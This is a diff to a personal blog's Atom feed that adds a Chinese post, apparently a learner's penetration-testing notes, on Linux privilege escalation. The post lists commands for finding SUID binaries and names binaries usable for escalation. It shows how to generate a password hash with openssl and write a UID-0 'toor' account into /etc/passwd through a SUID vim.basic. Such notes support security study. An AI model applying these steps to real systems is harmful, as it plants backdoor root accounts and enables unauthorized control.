@@ -6,7 +6,7 @@
   <link href="https://chimedal.github.io/atom.xml" rel="self"/>
   
   <link href="https://chimedal.github.io/"/>
-  <updated>2024-09-22T04:15:00.000Z</updated>
+  <updated>2024-09-22T15:42:00.000Z</updated>
   <id>https://chimedal.github.io/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Linux提权汇总</title>
+    <link href="https://chimedal.github.io/2024/09/22/Linux%E6%8F%90%E6%9D%83/"/>
+    <id>https://chimedal.github.io/2024/09/22/Linux%E6%8F%90%E6%9D%83/</id>
+    <published>2024-09-22T15:40:00.000Z</published>
+    <updated>2024-09-22T15:42:00.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>最近在接触渗透，发现提权是一项必不可少的内容，特新建一篇记录使用过的提权方法</p><h1 id="使用suid-vim-basic文件实现提权"><a href="#使用suid-vim-basic文件实现提权" class="headerlink" title="使用suid vim.basic文件实现提权"></a>使用suid vim.basic文件实现提权</h1><p>要求：vim.basic文件有suid权限</p><p><code>chmod u+s /usr/bin/vim.basic</code>可以设置</p><p>先<code>adduser test1</code>一个普通权限用户,开始提权！</p><p>通过以下命令可以找到存在suid权限的文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null <span class="comment">#常用</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; \；</span><br></pre></td></tr></table></figure></p><p>可用于提权的文件有</p><blockquote><p>nmap<br>vim<br>find<br>bash<br>more<br>less<br>nano<br>cp</p></blockquote><p>利用vim提权的思路是修改<code>etc/passwd</code>文件，为自己添加一个有<code>root</code>权限的用户</p><p>passwd文件用户格式为：<code>用户名:密码:uid:gid:注释:home目录:用户的shell</code></p><p>这边可以看看root用户的格式<code>root:x:0:0:root:/root:/bin/bash</code> （密码这部分之所以是x，是因为真正的密码存在/etc/shadow文件里）</p><p>生成密码：用<code>openssl passwd -1 –salt asd 123</code> （这里是-1（数字1）不是L）<br><img src="https://pic1.zhimg.com/80/v2-d6252d97872addc02b99d863b0e8adad_1440w.png" alt=""><br>直接写在passwd文件里面,<code>toor:$1$asd$sTMDZlRI6L.jJEw2I.3×8.:0:0:root:/toor:/bin/bash</code></p><p>用<code>vim /etc/passwd</code>可以修改，但是在保存是会出现E212，无法保存，提示我们没有权限修改这个</p><p>这时应该用之前find找到的vim.basic文件运行，这个程序是有suid权限的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim.basic /etc/passwd</span><br></pre></td></tr></table></figure><br>用这个打开，然后修改文件，就可以成功保存</p><p><code>su toor</code>切换，密码<code>123</code>，再<code>id</code>查看一下权限,成功提权</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;最近在接触渗透，发现提权是一项必不可少的内容，特新建一篇记录使用过的提权方法&lt;/p&gt;
+&lt;h1 id=&quot;使用suid-vim-basic文件实现提权&quot;&gt;&lt;a href=&quot;#使用suid-vim-basic文件实现提权&quot; class=&quot;headerlink&quot; title=&quot;使用</summary>
+      
+    
+    
+    
+    
+    <category term="Penetration" scheme="https://chimedal.github.io/tags/Penetration/"/>
+    
+  </entry>
   
   <entry>
     <title>春秋云境-Initial</title>
